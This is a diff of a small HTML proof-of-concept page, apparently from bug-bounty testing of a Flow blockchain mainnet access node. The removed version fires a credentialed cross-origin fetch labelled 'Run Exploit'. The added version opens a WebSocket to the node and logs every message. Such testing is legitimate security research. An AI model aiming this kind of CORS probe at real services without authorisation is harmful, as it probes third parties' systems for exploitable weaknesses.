@@ -1,31 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>CORS PoC - Flow Node Mainnet</title>
+  <meta charset="utf-8" />
+  <title>Flow WS CORS PoC</title>
 </head>
 <body>
-  <h2>CORS Misconfiguration PoC</h2>
-  <button onclick="exploit()">Run Exploit</button>
-  <pre id="output"></pre>
+  <h3>WebSocket CORS PoC</h3>
+  <button id="run">Open WS</button>
+  <pre id="out"></pre>
 
   <script>
-    async function exploit() {
-      try {
-        const response = await fetch("https://access.mainnet.nodes.flow.com/v1/blocks?start_height=88226270&end_height=88226275", {
-          method: "GET",
-          credentials: "include", // <== مهم جداً
-          headers: {
-            "Content-Type": "application/json"
-          }
-        });
+    const out = document.getElementById('out');
+    function log(...t){ out.textContent += t.join(' ') + '\n'; console.log(...t); }
 
-        const data = await response.text();
-        document.getElementById("output").textContent = data;
+    document.getElementById('run').addEventListener('click', () => {
+      try {
+        // افتح اتصال WebSocket من نفس origin (ستُرسل قيمة Origin تلقائياً)
+        const ws = new WebSocket('wss://access.mainnet.nodes.flow.com/v1/ws');
+
+        ws.onopen = () => {
+          log('OPEN: connection established');
+          // لو الخادم يرسل رسائل تلقائياً ستظهر هنا
+        };
+
+        ws.onmessage = (m) => {
+          log('MSG:', m.data);
+        };
+
+        ws.onerror = (e) => {
+          log('ERROR:', e && e.message ? e.message : e);
+        };
+
+        ws.onclose = (c) => {
+          log('CLOSED: code=' + c.code + ' reason=' + c.reason);
+        };
       } catch (err) {
-        document.getElementById("output").textContent = "Error: " + err;
+        log('Exception: ' + err);
       }
-    }
+    });
   </script>
 </body>
 </html>
